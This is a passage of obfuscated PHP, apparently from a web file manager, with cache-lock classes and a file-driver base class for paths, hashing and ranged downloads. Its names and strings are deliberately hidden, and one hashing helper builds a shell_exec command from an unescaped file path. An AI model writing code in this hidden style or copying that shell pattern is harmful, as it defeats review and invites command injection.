file_exists($è¥ì¿ã ); } public function unlock($±Úˆ€ô÷) { $İ×ÁœˆÉ =& $_SERVER[® ¨Ä®ñ]; $èŠå³†¨ = self::$caches[$±Úˆ€ô÷]; if (!$èŠå³†¨) { return; } @flock($èŠå³†¨[$İ×ÁœˆÉ[843]], LOCK_UN); @fclose($èŠå³†¨[$İ×ÁœˆÉ[843]]); @unlink($èŠå³†¨[$İ×ÁœˆÉ[192]]); unset(self::$caches[$±Úˆ€ô÷]); } } class CacheLockRedis { public function lock($ĞÃŞş‘Ü, $Æ¸öàû = 10) { $Ø‰Â˜öœ = Cache::init(); $¼Ö—Ãó‹ = microtime(!0) + $Æ¸öàû; while (microtime(!0) < $¼Ö—Ãó‹) { $çÆÎˆÉ = $Ø‰Â˜öœ->get($ĞÃŞş‘Ü); if (!$çÆÎˆÉ) { $ƒ¶˜­Ÿ— = $Ø‰Â˜öœ->setLock($ĞÃŞş‘Ü, $¼Ö—Ãó‹, $Æ¸öàû); if ($ƒ¶˜­Ÿ—) { return !0; } } else { if ($çÆÎˆÉ < microtime(!0)) { $Ø‰Â˜öœ->set($ĞÃŞş‘Ü, $¼Ö—Ãó‹, $Æ¸öàû * 2); if ($Ø‰Â˜öœ->get($ĞÃŞş‘Ü) === $çÆÎˆÉ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ÒĞ»êÄà) { return Cache::init()->get($ÒĞ»êÄà); } public function unlock($¶¢ ´¦£) { return Cache::init()->remove($¶¢ ´¦£); } } goto eÊç¤ˆºâ”; cì£¿íõÄ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $Èªºåñª =& $_SERVER[® ¨Ä®ñ]; $this->objectDriver = array($Èªºåñª[60], $Èªºåñª[61], $Èªºåñª[62], $Èªºåñª[63], $Èªºåñª[64], $Èªºåñª[65], $Èªºåñª[66], $Èªºåñª[67], $Èªºåñª[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Ñâ¶ß²û) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Ñâ¶ß²û, $_SERVER[® ¨Ä®ñ][8]); } return $Ñâ¶ß²û; } public function iconvApp($ÊÉø³È) { return $ÊÉø³È; } public function iconvSystem($ÄêÖÀªû) { return $ÄêÖÀªû; } public function iconvTo($±æƒ˜„, $Èû®€´ô, $µ¨òÏ˜Ÿ) { $èœŒ—ª¢ =& $_SERVER[® ¨Ä®ñ]; if (!$±æƒ˜„ || !function_exists($èœŒ—ª¢[69])) { return $±æƒ˜„; } static $€‚»ºçÍ = array(); $›ë°ˆ¼Û = $Èû®€´ô . $èœŒ—ª¢[70] . $µ¨òÏ˜Ÿ . $èœŒ—ª¢[71] . $±æƒ˜„; if (isset($€‚»ºçÍ[$›ë°ˆ¼Û])) { return $€‚»ºçÍ[$›ë°ˆ¼Û]; } if (function_exists($èœŒ—ª¢[72])) { $Ò±¦‹¯ = @mb_convert_encoding($±æƒ˜„, $µ¨òÏ˜Ÿ, $Èû®€´ô); } else { $Ò±¦‹¯ = @iconv($Èû®€´ô, $µ¨òÏ˜Ÿ, $±æƒ˜„); } $Ò±¦‹¯ = $Ò±¦‹¯ ? $Ò±¦‹¯ : $±æƒ˜„; if (strstr($Ò±¦‹¯, $èœŒ—ª¢[73])) { $Ò±¦‹¯ = str_replace($èœŒ—ª¢[73], $èœŒ—ª¢[11], $Ò±¦‹¯); } $€‚»ºçÍ[$Èû®€´ô . $èœŒ—ª¢[70] . $µ¨òÏ˜Ÿ . $èœŒ—ª¢[71] . $±æƒ˜„] = $Ò±¦‹¯; $€‚»ºçÍ[$µ¨òÏ˜Ÿ . $èœŒ—ª¢[70] . $Èû®€´ô . $èœŒ—ª¢[71] . $±æƒ˜„] = $±æƒ˜„; $€‚»ºçÍ[$µ¨òÏ˜Ÿ . $èœŒ—ª¢[70] . $Èû®€´ô . $èœŒ—ª¢[71] . $Ò±¦‹¯] = $±æƒ˜„; $€‚»ºçÍ[$Èû®€´ô . $èœŒ—ª¢[70] . $µ¨òÏ˜Ÿ . $èœŒ—ª¢[71] . $Ò±¦‹¯] = $Ò±¦‹¯; return $Ò±¦‹¯; } public function getPathInner($‹˜°•Íü) { $¸Úçæäô = IO::init($‹˜°•Íü); return $¸Úçæäô->path; } public function getPathOuter($Áø±ÆŞ¬) { $œşÊŞä =& $_SERVER[® ¨Ä®ñ]; $’ÍÄŸ½™ = strlen(trim($this->pathBase, $œşÊŞä[8])); $Áø±ÆŞ¬ = substr(trim($Áø±ÆŞ¬, $œşÊŞä[8]), $’ÍÄŸ½™); return $this->pathDriver . $œşÊŞä[8] . ltrim($Áø±ÆŞ¬, $œşÊŞä[8]); } public function isParentOf($½ÖÀÁ´¼, $‚öÍÜÁÄ) { $Ïµ¸Ğ·ˆ =& $_SERVER[® ¨Ä®ñ]; $½ÖÀÁ´¼ = rtrim(strtolower($½ÖÀÁ´¼), $Ïµ¸Ğ·ˆ[8]) . $Ïµ¸Ğ·ˆ[8]; $‚öÍÜÁÄ = rtrim(strtolower($‚öÍÜÁÄ), $Ïµ¸Ğ·ˆ[8]) . $Ïµ¸Ğ·ˆ[8]; $ÒúİìÍ = strpos($‚öÍÜÁÄ, $½ÖÀÁ´¼) === 0; return $ÒúİìÍ; } public function getType() { $Ó¸£ô±ø =& $_SERVER[® ¨Ä®ñ]; $ÂáœËö¸ = str_replace($Ó¸£ô±ø[74], $Ó¸£ô±ø[12], get_class($this)); return strtolower($ÂáœËö¸); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Î§é¤Á¥, $ğŸ¼Ï™¼) { $›ù€áŸ =& $_SERVER[® ¨Ä®ñ]; $­Îçİ–Ø = rtrim($Î§é¤Á¥, $›ù€áŸ[8]) . $›ù€áŸ[8] . $ğŸ¼Ï™¼; $£ïŸğê = $this->exist($­Îçİ–Ø); return $£ïŸğê ? $­Îçİ–Ø : !1; } public function setModifyTime($ÅğÈÙŞ, $°ó·Êšª = '') { } public function renameObject($à¯¢¾ö, $ÏÊÁâ¨) { $§ãæß• =& $_SERVER[® ¨Ä®ñ]; $íáÔ´¢× = $ÏÊÁâ¨; Hook::trigger($§ãæß•[75], $this, $à¯¢¾ö, $this, $this->pathFather($à¯¢¾ö) . $ÏÊÁâ¨); $à¯¢¾ö = $this->getPathOuter($à¯¢¾ö); $ÏÊÁâ¨ = $this->pathFather($à¯¢¾ö) . $ÏÊÁâ¨; if (IO::isFile($à¯¢¾ö)) { $¥¸ÜĞ ‰ = IO::copy($à¯¢¾ö, $this->pathFather($à¯¢¾ö), REPEAT_RENAME_FOLDER, $íáÔ´¢×); if ($¥¸ÜĞ ‰) { IO::remove($à¯¢¾ö); } } else { $¥¸ÜĞ ‰ = IO::mkdir($ÏÊÁâ¨); if (!$¥¸ÜĞ ‰) { return !1; } $µì«‚Š¶ = IO::listPath($à¯¢¾ö, !0); $âÄÎ”åÁ = array_merge($µì«‚Š¶[$§ãæß•[76]], $µì«‚Š¶[$§ãæß•[77]]); foreach ($âÄÎ”åÁ as $“½Şò¿ ) { IO::move($“½Şò¿ [$§ãæß•[78]], $ÏÊÁâ¨, REPEAT_RENAME_FOLDER); } IO::remove($à¯¢¾ö); } return $¥¸ÜĞ ‰ ? $ÏÊÁâ¨ : !1; } public function tempFile($õ ‘ï°™ = '', $úìÌµûÒ = '') { if (!$õ ‘ï°™) { $õ ‘ï°™ = rand_string(15); } $íÄó÷¥ş = TEMP_FILES . rand_string(15) . $_SERVER[® ¨Ä®ñ][8]; @mkdir($íÄó÷¥ş, DEFAULT_PERRMISSIONS, !0); $ºÚƒ† = $íÄó÷¥ş . $õ ‘ï°™; @touch($ºÚƒ†); if ($úìÌµûÒ) { file_put_contents($ºÚƒ†, $úìÌµûÒ); } return $ºÚƒ†; } public function tempFileRemve($±²ÛÏİ´) { @unlink($±²ÛÏİ´); @rmdir($this->pathFather($±²ÛÏİ´)); } public function mkfile($“Ú ­¾, $òø’•£ = '', $Éğî¸Àæ = REPEAT_RENAME) { } public function mkdir($¹³ï‰¸ï, $ßÜÏçè³ = REPEAT_SKIP) { } public function delFile($åöœ¾ÁŞ) { } public function delFolder($·±ÓóË”) { } public function copyFile($…Æë¤ñœ, $åƒäêıû) { } public function moveFile($é®·û, $ÍğåÀ) { } public function remove($¼Š×û¯Ş) { if ($this->isFile($¼Š×û¯Ş)) { return $this->delFile($¼Š×û¯Ş); } return $this->delFolder($¼Š×û¯Ş); } public function rename($Îı¨¹ÁÔ, $ß»‘àÍä) { } public function exist($§—é‚»‰) { } public function findByHash($§”–¶şÏ = '', $õòå€ì” = '') { return !1; } public function isFile($Ñ·ç•£¨) { } public function isFolder($÷«¤†Êç) { } public function size($¬´Ú¶•ù) { } public function info($ò¼èÂ¢) { } public function infoSimple($ıİ¬‡å”) { return $this->info($ıİ¬‡å”); } public function infoAuth($ÕªÌŸ¶) { return $this->info($ÕªÌŸ¶); } public function infoFull($ÇêŒ˜) { return $this->info($ÇêŒ˜); } public function infoWithChildren($Ù€Åé›) { $ŠæÈŒ®à =& $_SERVER[® ¨Ä®ñ]; static $ûÉÃÈøà = array(); if (isset($ûÉÃÈøà[$Ù€Åé›])) { return $ûÉÃÈøà[$Ù€Åé›]; } $‹úüğà± = $this->info($Ù€Åé›); if ($‹úüğà± && $‹úüğà±[$ŠæÈŒ®à[33]] == $ŠæÈŒ®à[79]) { $üÖ•¤Ø… = array($ŠæÈŒ®à[80] => 0, $ŠæÈŒ®à[81] => 0, $ŠæÈŒ®à[82] => 0); $this->infoChildren($Ù€Åé›, $üÖ•¤Ø…); $‹úüğà±[$ŠæÈŒ®à[80]] = $üÖ•¤Ø…[$ŠæÈŒ®à[80]]; $‹úüğà±[$ŠæÈŒ®à[83]] = array($ŠæÈŒ®à[84] => $üÖ•¤Ø…[$ŠæÈŒ®à[81]], $ŠæÈŒ®à[85] => $üÖ•¤Ø…[$ŠæÈŒ®à[82]]); $ûÉÃÈøà[$Ù€Åé›] = $‹úüğà±; } return $‹úüğà±; } public function listPath($ãôÌª–, $´ßûº ‡ = false) { } public function has($¸íïĞßÀ, $¿•ø¯µü = false, $©ØĞÌ³ = false) { } public function canRead($ã‘Èò¬Á) { } public function canWrite($¥­ïÌ”¿) { } public function getContent($ùÒˆ€—Ş) { } public function setContent($†à®¡†‹, $¬¶ˆáŒ = '') { } protected function infoChildren($Šæ¿“, &$ß…ëñ™‹) { $ºĞŠš÷ =& $_SERVER[® ¨Ä®ñ]; check_abort_echo(); $®âïÊÀ = $this->listPath($Šæ¿“, !0); $®âïÊÀ = array_merge($®âïÊÀ[$ºĞŠš÷[77]], $®âïÊÀ[$ºĞŠš÷[76]]); foreach ($®âïÊÀ as $ÇÅÉš‹›) { if ($ÇÅÉš‹›[$ºĞŠš÷[33]] == $ºĞŠš÷[79]) { $ß…ëñ™‹[$ºĞŠš÷[82]]++; $š³ø¯È’ = $this->getPathInner($ÇÅÉš‹›[$ºĞŠš÷[78]]); $this->infoChildren($š³ø¯È’, $ß…ëñ™‹); } else { $ß…ëñ™‹[$ºĞŠš÷[81]]++; $ß…ëñ™‹[$ºĞŠš÷[80]] += $ÇÅÉš‹›[$ºĞŠš÷[80]]; } } } public function fileSubstr($™ò›Çå, $ñì¸€ÔÌ, $ –ÖÊ‡Ì) { } public function listAll($ù×ü»ûğ) { } public function listAllMake($Ùºîˆè, &$¸‰„â ı) { $Ä†„ì° =& $_SERVER[® ¨Ä®ñ]; check_abort_echo(); $ã¦ÔÕõº = $this->listPath($Ùºîˆè, !0); if (!$ã¦ÔÕõº) { return; } $ÔÉÄ†ª¶ = array_merge($ã¦ÔÕõº[$Ä†„ì°[77]], $ã¦ÔÕõº[$Ä†„ì°[76]]); foreach ($ÔÉÄ†ª¶ as $ıÑØ‰ó) { $Ô­°‰°É = $ıÑØ‰ó[$Ä†„ì°[33]] == $Ä†„ì°[79]; $ŒÑœ›… = array($Ä†„ì°[78] => $ıÑØ‰ó[$Ä†„ì°[78]], $Ä†„ì°[79] => $Ô­°‰°É); if (isset($ıÑØ‰ó[$Ä†„ì°[80]])) { $ŒÑœ›…[$Ä†„ì°[80]] = $ıÑØ‰ó[$Ä†„ì°[80]]; } if (isset($ıÑØ‰ó[$Ä†„ì°[86]])) { $ŒÑœ›…[$Ä†„ì°[86]] = $ıÑØ‰ó[$Ä†„ì°[86]]; } if (!$Ô­°‰°É) { $¸‰„â ı[] = $ŒÑœ›…; continue; } $¸‰„â ı[] = $ŒÑœ›…; $»øöáş = $ıÑØ‰ó[$Ä†„ì°[78]]; $¬ãàÏ× = $this->pathDriver; if (substr($ıÑØ‰ó[$Ä†„ì°[78]], 0, strlen($¬ãàÏ×)) == $¬ãàÏ×) { $»øöáş = substr($»øöáş, strlen($¬ãàÏ×)); } $this->listAllMake($»øöáş, $¸‰„â ı); } } public function listAllSimple($¿ÛÉ²öë) { $Ê«•ı€¸ =& $_SERVER[® ¨Ä®ñ]; $®ë…ş´Ï = array(); $ê°Ê²‡ = $this->listAll($¿ÛÉ²öë); $Ÿèº¿¦ = $this->getPathOuter($¿ÛÉ²öë); foreach ($ê°Ê²‡ as $´‘ÀÕ´) { $ƒàÃÚ† = $´‘ÀÕ´[$Ê«•ı€¸[78]]; $æÑ–Üô› = $´‘ÀÕ´[$Ê«•ı€¸[78]]; if (isset($´‘ÀÕ´[$Ê«•ı€¸[87]])) { $ƒàÃÚ† = $´‘ÀÕ´[$Ê«•ı€¸[87]][$Ê«•ı€¸[78]]; $´‘ÀÕ´[$Ê«•ı€¸[80]] = $´‘ÀÕ´[$Ê«•ı€¸[87]][$Ê«•ı€¸[80]]; $´‘ÀÕ´[$Ê«•ı€¸[86]] = $´‘ÀÕ´[$Ê«•ı€¸[87]][$Ê«•ı€¸[86]]; } else { $æÑ–Üô› = substr($´‘ÀÕ´[$Ê«•ı€¸[78]], strlen(get_path_father($Ÿèº¿¦))); $æÑ–Üô› = $Ê«•ı€¸[8] . ltrim($æÑ–Üô›, $Ê«•ı€¸[8]); } $‰ö”›Ì¤ = array($Ê«•ı€¸[78] => $æÑ–Üô›, $Ê«•ı€¸[79] => $´‘ÀÕ´[$Ê«•ı€¸[79]]); if (isset($´‘ÀÕ´[$Ê«•ı€¸[80]]) && !$´‘ÀÕ´[$Ê«•ı€¸[79]]) { $‰ö”›Ì¤[$Ê«•ı€¸[80]] = $´‘ÀÕ´[$Ê«•ı€¸[80]]; } if (isset($´‘ÀÕ´[$Ê«•ı€¸[86]])) { $‰ö”›Ì¤[$Ê«•ı€¸[86]] = $´‘ÀÕ´[$Ê«•ı€¸[86]]; } if (!$´‘ÀÕ´[$Ê«•ı€¸[79]]) { $‰ö”›Ì¤[$Ê«•ı€¸[88]] = $ƒàÃÚ†; } $®ë…ş´Ï[] = $‰ö”›Ì¤; } return $®ë…ş´Ï; } public function upload($†…ãäÇ€, $Ş¿‘ÉÂô, $‘£Î†³´ = false, $¸üµÀŠÏ = REPEAT_REPLACE) { } public function uploadFileByID($Ÿ¨É¢Ã, $‰ÓÓ¾±Ä, $öÎøÉÚì) { } public function uploadFileByPath($Ò¡óß’É, $²˜´¯³, $¤ˆ¸ùÏ = array()) { } public function isUploadServer() { $²÷ğåµ =& $_SERVER[® ¨Ä®ñ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $²÷ğåµ[89]) { return !0; } return $GLOBALS[$²÷ğåµ[6]][$²÷ğåµ[90]][$²÷ğåµ[91]]; } public function isFileOutServer() { $³ˆ½Êæ =& $_SERVER[® ¨Ä®ñ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $³ˆ½Êæ[89]) { return !0; } return $GLOBALS[$³ˆ½Êæ[6]][$³ˆ½Êæ[90]][$³ˆ½Êæ[92]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($äØ’û®¢) { $¹ô‚ç =& $_SERVER[® ¨Ä®ñ]; if (!$this->isCdnHost()) { return $äØ’û®¢; } return str_replace(trim(get_url_root($äØ’û®¢), $¹ô‚ç[8]), trim($this->cdnHost, $¹ô‚ç[8]), $äØ’û®¢); } public function uploadLink($ÏÉ“·…„, $’éÒ ‰É = 0) { $ÖŸäñúù =& $_SERVER[® ¨Ä®ñ]; if ($this->isUploadServer()) { return; } $ÁŸÑÂÑ™ = $this->getType(); if (!in_array($ÁŸÑÂÑ™, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $½èî…Í¹ = 1024 * 1024 * 10; $û„½Æ¼© = $’éÒ ‰É <= $½èî…Í¹ ? $ÖŸäñúù[93] : $ÖŸäñúù[94]; $¶´»£†Ø = (!$’éÒ ‰É ? 1 : ceil($’éÒ ‰É / pow(1024, 3))) * 3600 * 4; $ âÃé = $this->{$û„½Æ¼©}($ÏÉ“·…„, $¶´»£†Ø); if ($ âÃé) { $ âÃé[$ÖŸäñúù[95]] = $ÏÉ“·…„; $ âÃé[$ÖŸäñúù[96]] = $ÁŸÑÂÑ™; } return $ âÃé; } public function uploadFormData($Ñ²ø®Ú’, $½£òï± = 3600) { } public function multiUploadFormData($¤ïñò¡ñ, $‹öÏ•çÇ = 3600) { } public function download($úšïšÀÌ, $òÔñ§î) { } public function ext($ÊŠíåƒ”) { $Ù£À™×¾ =& $_SERVER[® ¨Ä®ñ]; if (strpos($ÊŠíåƒ”, $Ù£À™×¾[8]) === -1) { $”²«€Å† = $ÊŠíåƒ”; } else { $”²«€Å† = $this->pathThis($ÊŠíåƒ”); } $ê¶š²¯ˆ = $Ù£À™×¾[12]; if (strstr($”²«€Å†, $Ù£À™×¾[10])) { $ê¶š²¯ˆ = substr($”²«€Å†, strrpos($”²«€Å†, $Ù£À™×¾[10]) + 1); $ê¶š²¯ˆ = strtolower($ê¶š²¯ˆ); } if (strlen($ê¶š²¯ˆ) > 3 && preg_match($Ù£À™×¾[97], $ê¶š²¯ˆ, $õ™×¼¨Ÿ)) { $ê¶š²¯ˆ = $Ù£À™×¾[12]; } return $ê¶š²¯ˆ; } public function pathThis($ÈÖò±ÛÆ) { $Ä«œü§æ =& $_SERVER[® ¨Ä®ñ]; $ÈÖò±ÛÆ = str_replace($Ä«œü§æ[98], $Ä«œü§æ[8], rtrim($ÈÖò±ÛÆ, $Ä«œü§æ[8])); $–ïºëŒù = strrpos($ÈÖò±ÛÆ, $Ä«œü§æ[8]); if ($–ïºëŒù === !1) { return $ÈÖò±ÛÆ; } return substr($ÈÖò±ÛÆ, $–ïºëŒù + 1); } public function pathFather($±Ëåàµ) { $šªÍÛ ê =& $_SERVER[® ¨Ä®ñ]; $±Ëåàµ = str_replace($šªÍÛ ê[98], $šªÍÛ ê[8], rtrim($±Ëåàµ, $šªÍÛ ê[8])); $ÂÏ²å†è = strrpos($±Ëåàµ, $šªÍÛ ê[8]); if ($ÂÏ²å†è === !1) { return $šªÍÛ ê[12]; } return substr($±Ëåàµ, 0, $ÂÏ²å†è + 1); } public function hashSimple($Ë¾û³¿Í) { $‚•á§™ñ =& $_SERVER[® ¨Ä®ñ]; if (!$Ë¾û³¿Í) { return md5($‚•á§™ñ[12]); } $Äı¸ßñ = $this->size($Ë¾û³¿Í); $ÄÈú˜§ = 200; $¸ªõ–ãË = 50; if ($Äı¸ßñ <= $ÄÈú˜§ * $¸ªõ–ãË) { return $this->hashMd5($Ë¾û³¿Í) . $Äı¸ßñ; } $µä„ôËÍ = intval($Äı¸ßñ / $¸ªõ–ãË); $¤µ“ùÓˆ = $‚•á§™ñ[12]; for ($£«©ä´» = 0; $£«©ä´» < $¸ªõ–ãË; $£«©ä´»++) { $¤µ“ùÓˆ .= $this->fileSubstr($Ë¾û³¿Í, $µä„ôËÍ * $£«©ä´», $ÄÈú˜§); } $¤µ“ùÓˆ .= $this->fileSubstr($Ë¾û³¿Í, $Äı¸ßñ - $ÄÈú˜§, $ÄÈú˜§); return md5($¤µ“ùÓˆ) . $Äı¸ßñ; } public static $md5Cache = array(); public function hashMd5($—öÜ‡ç¶) { if (!$—öÜ‡ç¶) { return md5($_SERVER[® ¨Ä®ñ][12]); } $—öÜ‡ç¶ = $this->iconvSystem($—öÜ‡ç¶); if (isset(self::$md5Cache[$—öÜ‡ç¶])) { return self::$md5Cache[$—öÜ‡ç¶]; } self::$md5Cache[$—öÜ‡ç¶] = $this->hashMd5Shell($—öÜ‡ç¶); if (!self::$md5Cache[$—öÜ‡ç¶]) { self::$md5Cache[$—öÜ‡ç¶] = @md5_file($—öÜ‡ç¶); } return self::$md5Cache[$—öÜ‡ç¶]; } private function hashMd5Shell($Øç„‹ºã) { $‰ˆ®Ù²¡ =& $_SERVER[® ¨Ä®ñ]; if (!$Øç„‹ºã) { return md5($‰ˆ®Ù²¡[12]); } if (!function_exists($‰ˆ®Ù²¡[99])) { return !1; } $ì¬¶†°İ = array($‰ˆ®Ù²¡[100], $‰ˆ®Ù²¡[101]); $ğò¡‡Ú¨ = Cache::get($‰ˆ®Ù²¡[102]); if (!$ğò¡‡Ú¨) { $ùÁéÛùò = BASIC_PATH . $‰ˆ®Ù²¡[103]; $Ê÷õªÖ‹ = md5_file($ùÁéÛùò); $ğò¡‡Ú¨ = $‰ˆ®Ù²¡[104]; foreach ($ì¬¶†°İ as $ïÅã»‘ğ) { $ò¹´íç = shell_exec($ïÅã»‘ğ . "\x20\x22{$ùÁéÛùò}\42"); if ($ò¹´íç && substr(trim($ò¹´íç), 0, 32) == $Ê÷õªÖ‹) { $ğò¡‡Ú¨ = $ïÅã»‘ğ; break; } } Cache::set($‰ˆ®Ù²¡[102], $ğò¡‡Ú¨, 3600); } if ($ğò¡‡Ú¨ == $‰ˆ®Ù²¡[104]) { return !1; } $ò¹´íç = shell_exec($ğò¡‡Ú¨ . "\40\42{$Øç„‹ºã}\x22"); $ò¹´íç = str_replace($‰ˆ®Ù²¡[105], $‰ˆ®Ù²¡[12], $ò¹´íç); return substr($ò¹´íç, 0, 32); } public function link($ ÀÕÏ«Õ) { return $ ÀÕÏ«Õ; } public function fileOut($€âŸûŒ‡, $ÍÅÕˆ™‡ = false, $®†üİ›ê = false, $àŒæ âÇ = '') { $‡—¦Óá§ =& $_SERVER[® ¨Ä®ñ]; $this->cacheMethod(null, null); if (!$€âŸûŒ‡ || !$this->exist($€âŸûŒ‡)) { show_json(LNG($‡—¦Óá§[106]), !1, $®†üİ›ê); } $ı¼…˜éü = $this->getType() == $‡—¦Óá§[107]; $­¨ôÄªµ = $GLOBALS[$‡—¦Óá§[6]][$‡—¦Óá§[90]][$‡—¦Óá§[108]][$‡—¦Óá§[109]]; $İÊ“’¬ñ = (double) $GLOBALS[$‡—¦Óá§[6]][$‡—¦Óá§[90]][$‡—¦Óá§[108]][$‡—¦Óá§[110]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $‚“È€Ê« = $this->infoFull($€âŸûŒ‡); $÷¬Î° ö = $‚“È€Ê«[$‡—¦Óá§[80]]; $»Î©ÆÂ = gmdate($‡—¦Óá§[111], $‚“È€Ê«[$‡—¦Óá§[86]]); $øÖìàôÕ = $®†üİ›ê ? $®†üİ›ê : $this->iconvApp($‚“È€Ê«[$‡—¦Óá§[32]]); $æ’€Æ§ = 0; $´å„Ì€¦ = $÷¬Î° ö - 1; $šÂ ±ğ· = $this->ext($øÖìàôÕ); if (in_array($šÂ ±ğ·, array($‡—¦Óá§[112], $‡—¦Óá§[113], $‡—¦Óá§[114], $‡—¦Óá§[115]))) { $šÂ ±ğ· = $‡—¦Óá§[116]; } if (!$àŒæ âÇ) { $àŒæ âÇ = md5($»Î©ÆÂ . $this->hashSimple($€âŸûŒ‡)); } $àŒæ âÇ = $‡—¦Óá§[117] . $àŒæ âÇ . $‡—¦Óá§[117]; $¸‡¯ó¼´ = get_file_mime($šÂ ±ğ·); if ($ÍÅÕˆ™‡ === !1 && !mime_support($¸‡¯ó¼´)) { $ÍÅÕˆ™‡ = !0; $¸‡¯ó¼´ = $‡—¦Óá§[118]; } header($‡—¦Óá§[119]); header($‡—¦Óá§[120] . $¸‡¯ó¼´); $ßä‚ šÛ = rawurlencode($øÖìàôÕ); $ßä‚ šÛ = $‡—¦Óá§[117] . $ßä‚ šÛ . $‡—¦Óá§[121] . $ßä‚ šÛ; if ($ÍÅÕˆ™‡) { header($‡—¦Óá§[122]); header($‡—¦Óá§[123] . $ßä‚ šÛ); } else { } header($‡—¦Óá§[124] . gmdate($‡—¦Óá§[111], time() + 3600 * 24 * 30) . $‡—¦Óá§[125]); header($‡—¦Óá§[126]); header($‡—¦Óá§[127]); header($‡—¦Óá§[128]); if (isset($_SERVER[$‡—¦Óá§[129]]) && strtotime($_SERVER[$‡—¦Óá§[129]]) == $‚“È€Ê«[$‡—¦Óá§[86]]) { header($‡—¦Óá§[130], !0, 304); die; } if (isset($_SERVER[$‡—¦Óá§[131]]) && $_SERVER[$‡—¦Óá§[131]] == $àŒæ âÇ) { header($‡—¦Óá§[132] . $àŒæ âÇ, !0, 304); die; } header($‡—¦Óá§[132] . $àŒæ âÇ); header($‡—¦Óá§[133] . $»Î©ÆÂ . $‡—¦Óá§[125]); header($‡—¦Óá§[134] . $øÖìàôÕ); header($‡—¦Óá§[135]); header($‡—¦Óá§[136] . $÷¬Î° ö); header($‡—¦Óá§[137]); if (!$ÍÅÕˆ™‡ && $šÂ ±ğ· == $‡—¦Óá§[138]) { if ($÷¬Î° ö > 1024 * 1024 * 5) { die; } $¨Ü¹„›Ã = $this->getContent($€âŸûŒ‡); $¨Ü¹„›Ã = Html::clearSVG($¨Ü¹„›Ã); header($‡—¦Óá§[139] . strlen($¨Ü¹„›Ã)); echo $¨Ü¹„›Ã; die; } $ïÛÌ ş€ = strtolower($_SERVER[$‡—¦Óá§[140]]); if ($ı¼…˜éü && $ïÛÌ ş€ && $­¨ôÄªµ) { if (strstr($ïÛÌ ş€, $‡—¦Óá§[141])) { header($‡—¦Óá§[142] . $€âŸûŒ‡); } else { if (strstr($ïÛÌ ş€, $‡—¦Óá§[143])) { header($‡—¦Óá§[144] . $€âŸûŒ‡); } else { if (strstr($ïÛÌ ş€, $‡—¦Óá§[145])) { header($‡—¦Óá§[146] . $€âŸûŒ‡); } } } if ($İÊ“’¬ñ) { header($‡—¦Óá§[147] . $İÊ“’¬ñ); } return; } if (isset($_SERVER[$‡—¦Óá§[148]])) { if (preg_match($‡—¦Óá§[149], $_SERVER[$‡—¦Óá§[148]], $çİ…µç)) { $æ’€Æ§ = intval($çİ…µç[1]); if (!empty($çİ…µç[2])) { $´å„Ì€¦ = intval($çİ…µç[2]); } } header($‡—¦Óá§[150]); header("\x43\x6f\x6e\164\145\156\164\55\122\141\x6e\x67\145\x3a\x20\142\x79\x74\145\x73\x20{$æ’€Æ§}\55{$´å„Ì€¦}\x2f" . $÷¬Î° ö); } else { header($‡—¦Óá§[151]); } header($‡—¦Óá§[152]); $€ıŸø’Æ = !0; if ($_SERVER[$‡—¦Óá§[153]] == $‡—¦Óá§[154] && $÷¬Î° ö > 1204 * 1024 * 1024 * 2) { $€ıŸø’Æ = !1; } if ($€ıŸø’Æ) { header($‡—¦Óá§[155] . ($´å„Ì€¦ - $æ’€Æ§ + 1)); } if ($_SERVER[$‡—¦Óá§[156]] == $‡—¦Óá§[157]) { return; } $âç½¿ĞÄ = 1024 * 100; $’îøæ£é = 0; if ($İÊ“’¬ñ) { $’îøæ£é = intval(1000 * 1000 * ($âç½¿ĞÄ / $İÊ“’¬ñ)); } while ($æ’€Æ§ <= $´å„Ì€¦) { $ÀÓ€¿Ğ• = timeFloat(); check_abort(); $û­ÉÕ = $´å„Ì€¦ - $æ’€Æ§ + 1; if ($û­ÉÕ <= $âç½¿ĞÄ) { $âç½¿ĞÄ = $û­ÉÕ; } echo $this->fileSubstr($€âŸûŒ‡, $æ’€Æ§, $âç½¿ĞÄ); $æ’€Æ§ += $âç½¿ĞÄ; if ($âç½¿ĞÄ == $û­ÉÕ) { $æ’€Æ§ = $´å„Ì€¦ + 1; } if ($’îøæ£é) { $¡€ÀÓ†¯ = intval(1000 * 1000 * (timeFloat() - $ÀÓ€¿Ğ•)); $á‡³Æâõ = $’îøæ£é - $¡€ÀÓ†¯; if ($á‡³Æâõ > 5) { usleep($á‡³Æâõ); } } } } public function fileOutServer($©·Æ¸, $‚Á”ÚÉ  = false, $ìôõ»åÌ = false, $ë‚Õ¤Ø¾ = '') { $this->fileOut($©·Æ¸, $‚Á”ÚÉ , $ìôõ»åÌ, $ë‚Õ¤Ø¾); } public function fileOutLink($­ëè×ï€) { header($_SERVER[® ¨Ä®ñ][158] . $­ëè×ï€); die; } public function cacheMethod($Ä»¦ˆõ, $´¬ğ½•, $Â¸ª„– = null) { $È™Û§àî =& $_SERVER[® ¨Ä®ñ]; static $×­ü¹¯· = array(); $áö°üÁš = $´¬ğ½• ? ltrim($this->getPathOuter($´¬ğ½•), $È™Û§àî[8]) : $´¬ğ½•; $ğÒş¬µ = $È™Û§àî[159] . $Ä»¦ˆõ . $È™Û§àî[160] . rtrim($áö°üÁš, $È™Û§àî[8]); if (is_null($Ä»¦ˆõ)) { $×­ü¹¯· = array(); return; } if (is_null($´¬ğ½•)) { unset($×­ü¹¯·[$ğÒş¬µ]); return; } if (!is_null($Â¸ª„–)) { $×­ü¹¯·[$ğÒş¬µ] = $Â¸ª„–; return; } $éü©Ìõ´ = isset($×­ü¹¯·[$ğÒş¬µ]) ? $×­ü¹¯·[$ğÒş¬µ] : null; if (!is_null($éü©Ìõ´)) { return $éü©Ìõ´; } $éü©Ìõ´ = $this->{$Ä»¦ˆõ}($´¬ğ½•); $×­ü¹¯·[$ğÒş¬µ] = $éü©Ìõ´; return 